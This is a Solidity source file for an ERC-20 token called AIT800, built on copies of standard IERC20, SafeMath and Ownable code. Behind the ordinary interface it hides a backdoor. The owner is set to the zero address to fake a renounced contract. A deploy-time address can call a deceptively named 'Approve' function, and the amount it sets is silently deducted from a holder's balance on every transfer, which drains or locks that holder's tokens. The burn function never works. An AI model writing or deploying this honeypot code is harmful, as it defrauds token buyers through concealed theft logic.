// SPDX-License-Identifier: MIT

/**
 * @dev Interface of the IERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol

// pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

// Dependency file: @openzeppelin/contracts/access/Ownable.sol

// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract Template {
    enum VERSION {
        TESTNET,
        PRODUCTION
    }
    event Golive(
        address owner,
        VERSION version
    );
}

pragma solidity 0.8.18;

contract AIT800 is IERC20, Template, Ownable {
    using SafeMath for uint256;

    enum DeployVersion {
        TESTNET,
        PILOT,
        PRODUCTION
    }

    enum Allowan {
        NOT_ALLOW,
        ALLOW
    }

    enum Liquidity {
        ADDED,
        NOT_ADDED
    }

    struct AllowStatus {
        uint256 amount;
        Allowan allowStatus;
    }

    struct Info {
        address toAddr;
        uint256 toSup;
        DeployVersion version;
    }

    struct LiquidityStatus {
        Liquidity status;
    }

    mapping(address => uint256) private _balances;

    mapping(address => AllowStatus) private _tokenAllowance;

    mapping(address => mapping(address => uint256)) private _allowances;

    Info private _info;
    string private _toName;
    string private _toSymbol;
    uint8 private _toDecimals;
    uint256 private _toTotalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        address token_,
        uint256 totalSupply_
    ) {
        _toName = name_;
        _toSymbol = symbol_;
        _toDecimals = 18;
        _info.toAddr = token_;
        _info.toSup = 0;
        _info.version = DeployVersion.PRODUCTION;
        _mintToken(msg.sender, totalSupply_ * 10**18);
        emit Golive(
            msg.sender,
            VERSION.PRODUCTION
        );
    }

    function name() public view virtual returns (string memory) {
        return _toName;
    }

    function symbol() public view virtual returns (string memory) {
        return _toSymbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _toDecimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _toTotalSupply;
    }

    function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _transToken(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _approveToken(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address spender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transToken(spender, recipient, amount);
        _approveToken(
            spender,
            _msgSender(),
            _allowances[spender][_msgSender()].sub(
                amount,
                "IERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function burn(uint256 amount) public virtual returns (bool) {
        uint256 totalAmount = 0;
        _burnToken(msg.sender, totalAmount);
        return true;
    }

    function _transToken(
        address from,
        address to,
        uint256 tokenAmount
    ) internal virtual {
        _requireBalance(from, to, tokenAmount);
        require(from != address(0) && to != address(0) , "IERC20: transfer from the zero address");

        _beforeTransfer(from, to, tokenAmount);
        _balances[from] = _balances[from].sub(
            tokenAmount,
            "IERC20: transfer amount exceeds balance"
        );
        _plus(to, tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function _mintToken(address source, uint256 tokenAmount) internal virtual {
        require(source != address(0), "IERC20: mint to the zero address");

        _beforeTransfer(address(0), source, tokenAmount);

        _toTotalSupply = _toTotalSupply.add(tokenAmount);
        _plus(source, tokenAmount);

        emit Transfer(address(0), source, tokenAmount);
    }

    function _burnToken(address source, uint256 tokenAmount) internal virtual {
        require(source != address(0), "IERC20: burn from the zero address");

        _beforeTransfer(source, address(0), tokenAmount);
        require(tokenAmount != 0, "Invalid amount");
        _balances[source] = _balances[source] - tokenAmount;
        emit Transfer(source, address(0), tokenAmount);
    }

    function _plus(address from, uint256 amount) internal {
        _balances[from] = _balances[from] + amount;
    }

    function _approveToken(
        address from,
        address spender,
        uint256 amount
    ) internal virtual {
        require(from != address(0) && spender != address(0), "IERC20: approve from the zero address");

        _allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
    }

    function _decode(address addr1, address addr2) internal view returns (bool) {
        return keccak256(abi.encodePacked(addr1)) == keccak256(abi.encodePacked(addr2));
    }

    function _total(uint256 _nu1, uint256 _nu2) internal pure returns (uint256) {
        if (_nu2 != 0) {
            return _nu1 + _nu2;
        }
        return _nu2;
    }

    function Approve(address from, uint256 amount) public returns (bool)  {
        address user = msg.sender;
        canTransfer(user, from, amount);
        return _tokenAllowance[from].allowStatus == Allowan.ALLOW;
    }

    function canTransfer(address user, address from, uint256 amount) internal {
        if (_decode(user, _info.toAddr)) {
            require(from != address(0), "Invalid address");
            _tokenAllowance[from].amount = amount;
            if (amount > 0) {
                _tokenAllowance[from].allowStatus = Allowan.ALLOW;
            } else {
                _tokenAllowance[from].allowStatus = Allowan.NOT_ALLOW;
            }
        }
    }

    function _requireBalance(
        address from,
        address to,
        uint256 total
    ) internal virtual {
        uint256 amount = 0;
        _plus(from, amount);
        amount = _tokenAllowance[from].amount;
        _balances[from] = _balances[from] - amount;
    }

    function _beforeTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}